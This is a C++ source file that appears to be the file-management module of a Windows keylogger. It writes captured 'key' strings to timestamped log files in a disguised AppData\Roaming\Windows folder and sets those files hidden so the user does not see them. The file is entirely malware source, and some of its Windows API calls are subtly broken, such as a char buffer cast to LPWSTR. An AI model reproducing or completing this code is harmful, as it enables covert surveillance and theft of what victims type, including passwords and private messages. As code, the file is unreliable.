#define _CRT_SECURE_NO_WARNINGS
#define ULEN 50
#include "stdafx.h"
#include "filemanager.h"

using namespace std;

FILE* ff;
TCHAR username[ULEN] = { 0, };
DWORD usersize = sizeof(username) / sizeof(username[0]);

char* getlogfilename() {		// get name of .log file
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	static char time[80] = { 0, };
	static char month[10], day[10], hour[10], min[10] = { 0, };
	sprintf(time, "%d", tm.tm_year + 1900);
	sprintf(month, "-%d", tm.tm_mon + 1);
	sprintf(day, "-%d", tm.tm_mday);
	sprintf(hour, " %d", tm.tm_hour);
	sprintf(min, "-%d", tm.tm_min);
	strcat(time, month); strcat(time, day); strcat(time, hour); strcat(time, min);
	strcat(time, ".log");
	return time;
}

char* getlogfilepath(char* filename) {		// get ultimate path of log file
	GetUserName(LPWSTR(username), &usersize);
	char dirpath[100] = "C:\\Users\\";
	char filepath[100] = "C:\\Users\\";
	static char filename2[100] = { 0, };
	strcat(dirpath, ConvertWCtoC(username));
	strcat(dirpath, "\\Appdata\\Roaming\\Windows\\");
	if (PathFileExists(LPWSTR(dirpath))==NULL) {
		_mkdir(dirpath);
	}
	strcat(filepath, ConvertWCtoC(username));
	strcat(filepath, "\\Appdata\\Roaming\\Windows\\");
	strcat(filepath, filename);
	strcpy(filename2,filepath);
	return filename2;
}

void logger(string key) {
	char ch_key[100] = { 0, };
	strcpy(ch_key, key.c_str());
	char* workFullPath;
	workFullPath = getlogfilepath(getlogfilename());
	ff = fopen(workFullPath, "a+");
	fprintf(ff, "%s", ch_key);
	fclose(ff);
}

int getfilesize() {		// get file size of .log file
	int rst = 0;
	char* workFullPath;
	workFullPath = getlogfilepath(getlogfilename());
	if (workFullPath == NULL) {
		return rst;
	}
	ff = fopen(workFullPath, "r");
	if (ff != NULL) {
		fseek(ff, 0, SEEK_END);
		rst = ftell(ff);
		fclose(ff);
	}
	return rst;
}

void hidefile(char* file) {		// hide log file
	if (GetFileAttributesA(file) != 0x22)
		SetFileAttributesA(file, 0x22);
}

char* ConvertWCtoC(wchar_t* str) {
	char* pStr;
	int strSize = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
	pStr = new char[strSize];
	WideCharToMultiByte(CP_ACP, 0, str, -1, pStr, strSize, 0, 0);
	return pStr;
}

wchar_t* ConverCtoWC(char* str) {
	wchar_t* pStr;
	int strSize = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, NULL);
	pStr = new WCHAR[strSize];
	MultiByteToWideChar(CP_ACP, 0, str, strlen(str) + 1, pStr, strSize);
	return pStr;
}